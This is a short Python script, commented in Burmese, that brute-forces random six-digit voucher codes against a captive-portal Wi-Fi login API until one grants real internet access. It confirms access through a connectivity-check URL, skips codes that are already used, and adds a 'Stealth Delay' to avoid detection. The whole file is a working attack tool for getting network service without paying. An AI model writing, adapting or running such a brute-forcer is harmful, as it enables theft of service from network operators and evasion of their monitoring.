import requests
import time
import random

# အင်တာနက် တကယ်ရမရ စစ်မည့် URL
CHECK_URL = "http://connectivitycheck.gstatic.com/generate_204"

def check_internet():
    try:
        # Redirect မလုပ်ဘဲ တိုက်ရိုက်ခေါ်ကြည့်သည်
        r = requests.get(CHECK_URL, timeout=3, allow_redirects=False)
        return r.status_code == 204
    except: return False

def final_scan(sid, api_url):
    print("[*] Searching for UNUSED/WORKING voucher...")
    while True:
        code = "".join([str(random.randint(0, 9)) for _ in range(6)])
        try:
            # ၁။ Login စမ်းကြည့်သည်
            res = requests.post(api_url, json={"accessCode": code, "sessionId": sid, "apiVersion": 1}, timeout=5)
            
            # ၂။ Login အောင်မြင်တယ်ဆိုရင် အင်တာနက် တကယ်ရမရ ထပ်စစ်သည်
            if res.status_code == 200:
                print(f"[*] Testing Code: {code} - System Accepted. Verifying Internet...")
                time.sleep(2) # Router အပြောင်းအလဲအတွက် ခဏစောင့်သည်
                
                if check_internet():
                    print(f"\n[+++] SUCCESS! THIS CODE IS WORKING: {code}")
                    break # အင်တာနက် ရပြီဆိုမှ ရပ်မည်
                else:
                    print(f"[-] Code {code} is ALREADY USED. Skipping...")
            
            time.sleep(2) # Stealth Delay
        except:
            time.sleep(5)
